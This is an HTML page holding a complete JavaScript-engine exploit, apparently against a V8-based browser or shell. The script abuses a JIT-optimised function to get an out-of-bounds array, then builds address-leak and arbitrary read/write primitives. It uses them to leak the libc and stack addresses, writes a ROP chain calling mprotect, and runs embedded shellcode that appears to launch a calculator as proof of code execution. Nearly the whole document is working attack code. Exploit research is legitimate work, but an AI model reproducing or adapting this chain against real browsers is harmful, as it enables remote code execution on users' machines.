<body>
<script>

function console(msg){
	document.body.innerText += msg + '\n';
}
var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);
var Uint32 = new Uint32Array(buf);

function f2i(f)
{
	float64[0] = f;
	return bigUint64[0]; 
}

function i2f(i)
{
	bigUint64[0] = i;
	return float64[0];
}

function f2half(val)
{
	float64[0] = val;
	let tmp = Array.from(Uint32);
	return tmp;
}

function half2f(val)
{
	Uint32.set(val);
	return float64[0];
}

function hex(i)
{
	return i.toString(16).padStart(16, "0");
}

function ByteToBigIntArray(payload)
{

    let sc = []
    let tmp = 0n;
    let lenInt = BigInt(Math.floor(payload.length/8))
    for (let i = 0n; i < lenInt; i += 1n) {
        tmp = 0n;
        for(let j=0n; j<8n; j++){
            tmp += BigInt(payload[i*8n+j])*(0x1n<<(8n*j));
        }
        sc.push(tmp);
    }

    let len = payload.length%8;
    tmp = 0n;
    for(let i=0n; i<len; i++){
        tmp += BigInt(payload[lenInt*8n+i])*(0x1n<<(8n*i));
    }
    sc.push(tmp);
    return sc;
}

function gc() {
    for (let i = 0; i < 100; i++) {
        new ArrayBuffer(0x100000);
    }
}

function foo(a, b) {
	let tmp = {};
	b[0] = 0;
	a.length;
	for(let i = 0; i < a.length; i++){
		a[i] = tmp;
	}
	let o = [1.1];
	b[15] = 4.063e-320;
	return o;
}

var arr_addr_of = new Array(1);
arr_addr_of[0] = 'a';
for(let i = 0; i < 10000; i++) {
	eval(`var tmp_arr = [1.1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24];`);
	foo(arr_addr_of, [1.1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24]);
	foo(tmp_arr, [1.1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24]);
}

gc();

var float_arr = [1.1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24];
var oob_array = foo(float_arr, float_arr, {});

var obj_array = {mark: 0xdead, obj: arr_addr_of};
var big_array = new BigUint64Array(6);
big_array[0] = 0x1234n;
big_array[1] = 0xaabbn;

console("[+] oob_array length: " + hex(oob_array.length));

var obj_idx = 0;
for(let i = 0; i < 0x500; i++)
{
	let tmp = f2half(oob_array[i]);
	if(tmp[1] == (0xdead << 1)){
		obj_idx = i+1;
		break;
	}
}

console("[+] obj_idx: 0x"+ hex(obj_idx));

var external_pointer_idx = 0;
var base_pointer_idx = 0;
var bigarray_len_idx = 0;

for(let i=0; i < 0x500; i++)
{
	if(f2i(oob_array[i]) == 0x1234n){
		bigarray_len_idx = i + 10;
		console("[+] find bigarray length : 0x" + hex(f2i(oob_array[bigarray_len_idx])));
		external_pointer_idx = i + 11;
		external_pointer = f2i(oob_array[external_pointer_idx]);
		console("[+] find external_pointer : 0x" + hex(external_pointer));
		base_pointer_idx = i + 12;
		base_pointer = f2i(oob_array[base_pointer_idx]);
		console("[+] find base_pointer : 0x" + hex(base_pointer));
		break;
	}
}

var highaddr = f2i(oob_array[external_pointer_idx]) & 0xffffffff00000000n;
console("[+] highaddr : 0x" + hex(highaddr));

function heap_read(addr)
{
	oob_array[base_pointer_idx] = i2f(addr-0x8n);
	let ret = big_array[0];
	return BigInt(ret);
}

function arb_read(addr)
{
	oob_array[base_pointer_idx] = i2f(0n);
	oob_array[external_pointer_idx] = i2f(addr);
	let ret = big_array[0];
        return ret;

}

function arb_write(addr, payload)
{
	sc = ByteToBigIntArray(payload);
	oob_array[bigarray_len_idx] = i2f(BigInt(sc.length));
	oob_array[base_pointer_idx] = i2f(0n);
	oob_array[external_pointer_idx] = i2f(addr);

	for(let i = 0; i < sc.length; i++) {
        	big_array[i] = sc[i];
   	}
}

function arb_write64(addr, payload)
{
	oob_array[bigarray_len_idx] = i2f(0x100n);
	oob_array[base_pointer_idx] = i2f(0n);
	oob_array[external_pointer_idx] = i2f(addr);
        big_array[0] = payload;
}

function addr_of(obj)
{
	obj_array.obj = obj;
	let addr = f2half(oob_array[obj_idx]);
	let obj_addr = addr[0];
	return BigInt(obj_addr);
}

var arr = [1.1, 2.2, 3.3];
var arr_addr = addr_of(arr.constructor);
console("[+] arr_addr constructor: 0x" + hex(arr_addr));
var constructor_code = heap_read(arr_addr + 0x18n) & (0xffffffffn);
console("[+] constructor_code : 0x" + hex(constructor_code));

var code_text_addr = heap_read(constructor_code + 0x40n) >> 16n;
console("[+] code_text_addr : 0x" + hex(code_text_addr));

var text_base = code_text_addr - 0x3e9dc0n;
console("[+] text_base : 0x" + hex(text_base));

var printf_got = text_base + 0xee7000n;
console("[+] printf_got : 0x" + hex(printf_got));

var printf_addr = arb_read(printf_got);
console("[+] printf_addr : 0x" + hex(printf_addr));

var libc_base = printf_addr - 0x3fe10n; // /usr/lib/x86_64-linux-gnu/libc-2.31.so 
console("[+] libc_base : 0x" + hex(libc_base));

var environ = libc_base + 0x1ca2e0n;
console("[+] environ : 0x" + hex(environ));

var stack_pointer = arb_read(environ);
console("[+] stack_pointer : 0x" + hex(stack_pointer));

let ret = text_base + 0x3bd1can;             // ret;
let ret_0x78 = text_base + 0x6e0f1en;         // add rsp 0x78; pop rbx; pop rbp; ret
let pop_rdi_ret = text_base + 0x6010bbn;        // pop rdi; ret
let pop_rsi_ret = text_base + 0x414eden;        // pop rsi; ret
let pop_rdx_ret = text_base + 0x9f8c5an;        // pop rdx; ret
let mprotect_addr = libc_base + 0xf6970n;   // *** mprotect libc offset
console("[+] mprotect addr: 0x" + hex(mprotect_addr));

var shellcode_addr = (external_pointer + base_pointer) & (0xfffffffffff00000n+0x3000n);
console("[+] shellcode_addr: 0x" + hex(shellcode_addr));

var rop = [
	pop_rdi_ret,
	shellcode_addr,
	pop_rsi_ret,
	0x1000n,
	pop_rdx_ret,
	0x7n,
	mprotect_addr,
	shellcode_addr,
]

var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
    96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
    105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
    72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
    72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
    184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
    94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];

arb_write(shellcode_addr, shellcode);

for(let i = 0; i < rop.length; i++){
	arb_write64(stack_pointer - BigInt(rop.length-i)*8n, rop[i]);	
}

oob_array[bigarray_len_idx] = i2f(0x300n);
oob_array[base_pointer_idx] = i2f(0n);
oob_array[external_pointer_idx] = i2f(stack_pointer-0x300n*8n - 8n*BigInt(rop.length));

for(let i = 0x300; i > 0; i--) {
	if(i > 0x100){
        	big_array[i] = ret;
	}else{
		big_array[i] = ret_0x78;
	}
	//if(i == 0x300-2)
	//	readline();
}

</script>
</body>
